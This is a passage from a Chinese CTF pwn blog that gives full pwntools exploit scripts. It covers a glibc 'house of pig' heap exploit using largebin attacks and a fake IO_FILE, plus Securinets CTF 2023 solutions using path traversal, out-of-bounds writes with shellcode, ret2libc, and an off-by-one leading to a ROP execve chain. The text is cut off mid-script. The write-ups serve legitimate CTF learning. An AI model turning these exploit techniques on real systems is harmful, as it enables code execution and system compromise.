<span class="comment"># A19</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#B8 0x440进入unsortedbin</span></span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#B8 0x440进入largebin</span></span><br><span class="line">Add(<span class="number">0x450</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B9</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#A17进入unsortedbin</span></span><br><span class="line">Del(<span class="number">17</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#修改B8的fd_nextsize和bk_nextsize 因为mompig的编辑是从0x10开始的</span></span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(free_hook-<span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#触发largebin attach的victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;即 free_hook-0x28+0x20处写入</span></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># C0</span></span><br><span class="line">b()</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#恢复之前破坏的B8的fd_nextsize和bk_nextsize</span></span><br><span class="line">Edit(<span class="number">8</span>,<span class="number">2</span>*p64(heap_base + <span class="number">0x13e80</span>)+ <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----- second largebin_attac</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#拿出上次触发largebin attach时申请0xa0切割后放入unsortedbin的堆块</span></span><br><span class="line">Add(<span class="number">0x380</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">19</span>)<span class="comment"># A19</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(IO_list_all-<span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#,继续触发largebinattach 在IO_list_all写入堆地址</span></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#恢复之前破坏的B8的fd_nextsize和bk_nextsize</span></span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- tcache_stashing_unlink_attack and FILE attack</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#利用uaf修改A8放入smallbin的fd和bk,编辑的时候0x48大小只能接受0x16数据，0x50可以写0x48*(0x50//16)=0xf0大小，可以覆盖到smallbin里的fd bk</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x50</span> + p64(heap_base+<span class="number">0x12280</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">Edit(<span class="number">8</span>, payload + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(heap_base+<span class="number">0x147c0</span>)</span><br><span class="line"><span class="comment">#把写入iolistall的堆地址从largebin里申请出来,并把FILE的chain改写为smallbin第一个</span></span><br><span class="line">Add(<span class="number">0x440</span>, payload)<span class="comment">#C3</span></span><br><span class="line"><span class="comment">#触发tcache_stashing_unlink_attack，将0xa0大小的free_hook-0x10链入tcache中</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b calloc&#x27;)</span></span><br><span class="line">Add(<span class="number">0x90</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># C4</span></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1e9560</span></span><br><span class="line">system_addr = libc_base + libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>) <span class="comment">#fp-&gt;flag=0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line"><span class="comment">#满足fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148a0</span>)                <span class="comment">#v4 _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148b8</span>)                <span class="comment">#v5 _IO_buf_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable)        <span class="comment">#change vtable</span></span><br><span class="line">payload = fake_IO_FILE + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span>*p64(system_addr)</span><br><span class="line"><span class="comment">#这里的gift申请 calloc(1uLL, 0xE8uLL);会从smallbin里把之前写入chain的堆块拿出来</span></span><br><span class="line">sa(<span class="string">&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">b()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>伪造完且exit返回之前</p><p><img src="/2023/08/12/house-of-pig/image-20230813173155790.png" alt="image-20230813173155790"></p><p><img src="/2023/08/12/house-of-pig/image-20230813173349353.png" alt="image-20230813173349353"></p><p><img src="/2023/08/12/house-of-pig/image-20230813173329624.png" alt="image-20230813173329624"></p><p>当退出时触发exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow</p><p>会malloc(2 * ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) + 100)&#x3D;malloc(0x94)会申请到free hook-0x10</p><p>memcpy会把system写入free_hook，最后触发free (old_buf);触发system(&#x2F;bin&#x2F;sh)</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/mozibai666/article/details/120121891">https://blog.csdn.net/mozibai666/article/details/120121891</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 Securinets CTF Quals</title>
      <link href="/2023/08/10/2023-securinets-ctf/"/>
      <url>/2023/08/10/2023-securinets-ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="Admin-Service"><a href="#Admin-Service" class="headerlink" title="Admin Service"></a>Admin Service</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/S/A/togive&gt; checksec ./services</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/Admin Service/togive/services&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;./&#x27;</span><br></pre></td></tr></table></figure><p>开了沙箱</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/S/A/togive&gt; seccomp-tools dump ./services</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x00000038  if (A == clone) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000039  if (A == fork) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x0000003a  if (A == vfork) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>readChat可以跳出目录利用&#x2F;proc&#x2F;self&#x2F;maps泄露基地址，updateConfig可以无限越界写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./services&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcfg</span>(<span class="params">idx, v</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Config index:&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.send(v)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readchat</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Chat ID:\n&quot;</span>, name)</span><br><span class="line">dbpie(<span class="string">&#x27;0x016D6&#x27;</span>)</span><br><span class="line">readchat(<span class="string">b&#x27;../../../../../../../../../proc/self/maps&#x27;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;55cc2374d000&#x27;</span>)),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">backupCode=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;7fa5dd3e7000&#x27;</span>)),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">p(<span class="string">&#x27;backupCode&#x27;</span>,backupCode)</span><br><span class="line">config=<span class="number">0x4060</span>+pie</span><br><span class="line">setcfg((<span class="number">0x4070</span>-<span class="number">0x4060</span>)//<span class="number">8</span>,p64(<span class="number">0x20C2</span>+pie))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">buffer=elf.bss()+pie+<span class="number">0x100</span></span><br><span class="line">pld = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)+shellcraft.read(<span class="number">3</span>,buffer, <span class="number">0x50</span>) + shellcraft.write(<span class="number">1</span>,buffer,<span class="number">0x50</span>)) </span><br><span class="line"><span class="built_in">print</span>(pld)</span><br><span class="line">setcfg((<span class="number">0x40A8</span>-<span class="number">0x4060</span>)//<span class="number">8</span>,p64(backupCode))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pld), <span class="number">8</span>):</span><br><span class="line">    setcfg((backupCode-(<span class="number">0x4060</span>+pie))//<span class="number">8</span>+i//<span class="number">8</span>, pld[i:i+<span class="number">8</span>])</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">sla(<span class="string">b&quot;Choice:&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230813211518532.png" alt="image-20230813211518532"></p><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/S/r/togive&gt; checksec main</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/ret2libc/togive/main&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8047000)</span><br><span class="line">    RUNPATH:  b&#x27;./&#x27;</span><br></pre></td></tr></table></figure><p>栈溢出，但是通过ecx寄存器把原来的esp保存到栈上，再常规提升堆栈，导致ret和ebp直接有一段距离，找到ret需要栈上之前保存的esp值，所以不能覆盖ret</p><p>可以利用gets把‘\n’截断为\x00覆盖存放在栈上的esp的低位为00，有很大机率将esp提升到我们gets输入的栈空间，payload前面用ret填充后面写top链即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">080491</span>D3 <span class="number">8</span>D <span class="number">4</span>C <span class="number">24</span> <span class="number">04</span>                   lea     ecx, [esp+<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080491</span>D7 <span class="number">83</span> E4 F0                      and     esp, <span class="number">0F</span>FFFFFF0h</span><br><span class="line">.text:<span class="number">080491</span>DA FF <span class="number">71</span> FC                      push    dword ptr [ecx<span class="number">-4</span>]</span><br><span class="line">.text:<span class="number">080491</span>DD <span class="number">55</span>                            push    ebp</span><br><span class="line">.text:<span class="number">080491</span>DE <span class="number">89</span> E5                         mov     ebp, esp</span><br><span class="line">.text:<span class="number">080491E0</span> <span class="number">53</span>                            push    ebx</span><br><span class="line">.text:<span class="number">080491E1</span> <span class="number">51</span>                            push    ecx</span><br><span class="line">.text:<span class="number">080491E2</span> <span class="number">83</span> EC <span class="number">50</span>                      sub     esp, <span class="number">50</span>h</span><br><span class="line">.text:<span class="number">080491E5</span> E8 C6 FE FF FF                call    __x86_get_pc_thunk_bx</span><br><span class="line">.text:<span class="number">080491E5</span></span><br><span class="line">.text:<span class="number">080491</span>EA <span class="number">81</span> C3 <span class="number">0</span>A <span class="number">2</span>E <span class="number">00</span> <span class="number">00</span>             add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:<span class="number">080491F</span>0 E8 <span class="number">81</span> FF FF FF                call    setup</span><br><span class="line">.text:<span class="number">080491F</span>0</span><br><span class="line">.text:<span class="number">080491F</span>5 <span class="number">83</span> EC <span class="number">0</span>C                      sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">080491F</span>8 <span class="number">8</span>D <span class="number">83</span> <span class="number">14</span> E0 FF FF             lea     eax, (aIsThisSolveabl - <span class="number">804B</span>FF4h)[ebx] ; <span class="string">&quot;Is this solveable?&quot;</span></span><br><span class="line">.text:<span class="number">080491F</span>E <span class="number">50</span>                            push    eax                             ; s</span><br><span class="line">.text:<span class="number">080491F</span>F E8 <span class="number">4</span>C FE FF FF                call    _puts</span><br><span class="line">.text:<span class="number">080491F</span>F</span><br><span class="line">.text:<span class="number">08049204</span> <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08049207</span> <span class="number">83</span> EC <span class="number">0</span>C                      sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0804920</span>A <span class="number">8</span>D <span class="number">45</span> A8                      lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">0804920</span>D <span class="number">50</span>                            push    eax                             ; s</span><br><span class="line">.text:<span class="number">0804920</span>E E8 <span class="number">2</span>D FE FF FF                call    _gets</span><br><span class="line">.text:<span class="number">0804920</span>E</span><br><span class="line">.text:<span class="number">08049213</span> <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08049216</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0804921B</span> <span class="number">8</span>D <span class="number">65</span> F8                      lea     esp, [ebp<span class="number">-8</span>]</span><br><span class="line">.text:<span class="number">0804921</span>E <span class="number">59</span>                            pop     ecx</span><br><span class="line">.text:<span class="number">0804921F</span> <span class="number">5B</span>                            pop     ebx</span><br><span class="line">.text:<span class="number">08049220</span> <span class="number">5</span>D                            pop     ebp</span><br><span class="line">.text:<span class="number">08049221</span> <span class="number">8</span>D <span class="number">61</span> FC                      lea     esp, [ecx<span class="number">-4</span>]</span><br><span class="line">.text:<span class="number">08049224</span> C3                            retn</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io=remote(<span class="string">&#x27;pwn.ctf.securinets.tn&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line">        <span class="comment"># io=process(pwnfile)</span></span><br><span class="line">        ret=<span class="number">0x804923B</span></span><br><span class="line">        padding=p32(ret)*((<span class="number">0x50</span>-<span class="number">12</span>)//<span class="number">4</span>)</span><br><span class="line">        payload=flat(padding,</span><br><span class="line">                    elf.plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">                    elf.sym[<span class="string">&#x27;main&#x27;</span>],</span><br><span class="line">                    elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">                    )</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;solveable?&#x27;</span>,payload)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        puts_ad=io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>,drop=<span class="literal">False</span>,timeout=<span class="number">4</span>)</span><br><span class="line">        puts_ad=uu32(puts_ad)</span><br><span class="line">        <span class="keyword">if</span>(puts_ad!=<span class="number">0</span>):</span><br><span class="line">          <span class="comment"># gdb.attach(io,&#x27;b *0x8049216&#x27;)</span></span><br><span class="line">          libcbase=puts_ad-libcelf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">          system_ad=libcbase+libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">          binsh=libcbase+<span class="built_in">next</span>(libcelf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">          payload=flat(padding,</span><br><span class="line">                    system_ad,</span><br><span class="line">                    elf.sym[<span class="string">&#x27;main&#x27;</span>],</span><br><span class="line">                    binsh</span><br><span class="line">                    )</span><br><span class="line">          io.sendlineafter(<span class="string">b&#x27;solveable?&#x27;</span>,payload)</span><br><span class="line">          io.interactive()</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810183252407.png" alt="image-20230810183252407"></p><h2 id="One-is-enough"><a href="#One-is-enough" class="headerlink" title="One is enough"></a>One is enough</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/mnt/hgfs/share/match/Securinetsctf/One is enough/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>readInput里有一个字节的溢出，所以在两个功能函数都能修改保存到栈上的main函数的rbp，静态编译的程序里面有syscall的gadget，所以就可以控制rbp在main返回时利用rop</p><p>断点下到 readDescription的memMove，只要main的rbp和读入数据的栈地址只有最后一位不同就行，大概也就16种可能，总有机会会爆破到</p><p><img src="/2023/08/10/2023-securinets-ctf/image-20230810223319615.png" alt="image-20230810223319615"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># db(&#x27;0x401866&#x27;)</span></span><br><span class="line">    <span class="comment"># db(&#x27;0x040186B&#x27;)</span></span><br><span class="line">    pop_rax=<span class="number">0x0000000000431c77</span></span><br><span class="line">    pop_rsi=<span class="number">0x000000000040ab23</span></span><br><span class="line">    pop_rdi=<span class="number">0x0000000000401f3d</span></span><br><span class="line">    pop_rdx_rbx=<span class="number">0x0000000000463367</span></span><br><span class="line">    syscall=<span class="number">0x00000000004121e2</span></span><br><span class="line">    padding=cyclic(<span class="number">0x100</span>-<span class="number">0xf0</span>)</span><br><span class="line">    payload=flat(<span class="number">0xdeadbeef</span>,</span><br><span class="line">                pop_rdi,<span class="number">0</span>,pop_rsi,elf.bss()+<span class="number">0x100</span>,pop_rdx_rbx,<span class="number">59</span>,<span class="number">0</span>,elf.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">                pop_rdi,elf.bss()+<span class="number">0x100</span>,pop_rsi,<span class="number">0</span>,pop_rdx_rbx,<span class="number">0</span>,<span class="number">0</span>,syscall)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sla(<span class="string">b&#x27;Quit\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;tion:&#x27;</span>,payload)</span><br><span 